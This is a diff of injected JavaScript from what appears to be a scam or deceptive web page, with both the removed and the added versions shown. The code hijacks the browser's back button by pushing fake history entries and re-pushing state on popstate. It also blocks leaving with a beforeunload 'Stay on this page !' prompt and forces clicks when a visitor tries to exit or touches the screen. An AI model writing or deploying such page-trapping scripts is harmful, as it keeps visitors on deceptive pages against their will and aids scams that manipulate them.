@@ -1017,45 +1017,44 @@ if(navigator.userAgent.indexOf("Chrome") != -1) {
 
 var scriptZA = document.createElement("script");
 scriptZA.type="text/javascript";
-scriptZA.innerHTML=`
-
-! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
-history.go(1);
-}); } } catch (o) {} }();
-
-`;
-document.getElementsByTagName('body')[0].prepend(scriptZA);
+scriptZA.innerHTML='! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener("popstate", function () { history.go(1); }); } } catch (o) {} }();';
+document.getElementsByTagName("body")[0].appendChild(scriptZA);
 
 var scriptZQ = document.createElement("script");
 scriptZQ.type="text/javascript";
-scriptZQ.innerHTML=`
+scriptZQ.innerHTML='window.history.pushState(null, null, window.location.href); window.onpopstate = function () { alert("hu"); one(); };';
+document.getElementsByTagName('body')[0].appendChild(scriptZQ);
 
-window.history.pushState(null, null, window.location.href);
-window.onpopstate = function () {
-document.querySelector('#startAN').click();
-setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
-one();
-};
+var scriptZS = document.createElement("script");
+scriptZS.type="text/javascript";
+scriptZS.innerHTML='function addOB(en) { en.returnValue = "Stay on this page !"; }; window.addEventListener("beforeunload", addOB);';
+document.getElementsByTagName('body')[0].appendChild(scriptZS);
 
-`;
-document.getElementsByTagName('body')[0].prepend(scriptZQ);
+var scriptZN = document.createElement("script");
+scriptZN.type="text/javascript";
+scriptZN.innerHTML='function one() { window.removeEventListener("beforeunload", addOB); }';
+document.getElementsByTagName('body')[0].appendChild(scriptZN);
 
 } else {
 
-var scriptZT = document.createElement("script");
-scriptZT.type="text/javascript";
-scriptZT.innerHTML=`
+var scriptZR = document.createElement("script");
+scriptZR.type="text/javascript";
+scriptZR.innerHTML='history.pushState(null, null, document.URL); window.addEventListener("popstate", function () { history.pushState(null, null, document.URL); alert("hu"); one(); });';
+document.getElementsByTagName('body')[0].appendChild(scriptZR);
 
-! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
-history.go(1);
-}); } } catch (o) {} }();
+var scriptZS = document.createElement("script");
+scriptZS.type="text/javascript";
+scriptZS.innerHTML='function addOB(en) { en.returnValue = "Stay on this page !"; }; window.addEventListener("beforeunload", addOB);';
+document.getElementsByTagName('body')[0].appendChild(scriptZS);
 
-`;
-document.getElementsByTagName('body')[0].prepend(scriptZT);
+var scriptZN = document.createElement("script");
+scriptZN.type="text/javascript";
+scriptZN.innerHTML='function one() { window.removeEventListener("beforeunload", addOB); }';
+document.getElementsByTagName('body')[0].appendChild(scriptZN);
 
 };
 
-sessionStorage.setItem("click", 500);
+sessionStorage.setItem("reload", 100);
 
 };
 
@@ -1073,40 +1072,8 @@ one();
 
 
 
-var width = window.innerWidth;
-if (width <= 520) {
-
-addEventListener('touchstart', function(e) {
-var myCN = e.target.className;
-if(myCN!='orderX'){
-
-myFuncQ();
-
-} else {
-
-
-
-}
-});
-
-} else if (width <= 820) {
-
-addEventListener('touchstart', function(e) {
-var myCN = e.target.className;
-if(myCN!='orderX'){
-
-myFuncQ();
-
-} else {
-
-
-
-}
-});
-
-} else { };
-
-
+var widthZ = window.innerWidth;
+if (widthZ <= 520) { } else if (widthZ <= 820) { } else {
 
 var mouseY = 0;
 var topValue = 0;
@@ -1119,18 +1086,13 @@ document.querySelector('#startAN').click(); setTimeout(function scroll() { windo
 }
 }, false);
 
-function myFuncQ(){
-myFuncQ = function(){};
+};
 
-var scriptZS = document.createElement("script");
-scriptZS.type="text/javascript";
-scriptZS.innerHTML="function addOB(en) { en.returnValue = 'Stay on this page !'; }; window.addEventListener('beforeunload', addOB);";
-document.getElementsByTagName('body')[0].appendChild(scriptZS);
 
-var scriptZN = document.createElement("script");
-scriptZN.type="text/javascript";
-scriptZN.innerHTML="function one() { window.removeEventListener('beforeunload', addOB); }";
-document.getElementsByTagName('body')[0].appendChild(scriptZN);
+
+
+
+
 
 sessionStorage.setItem("reload", 100);
 
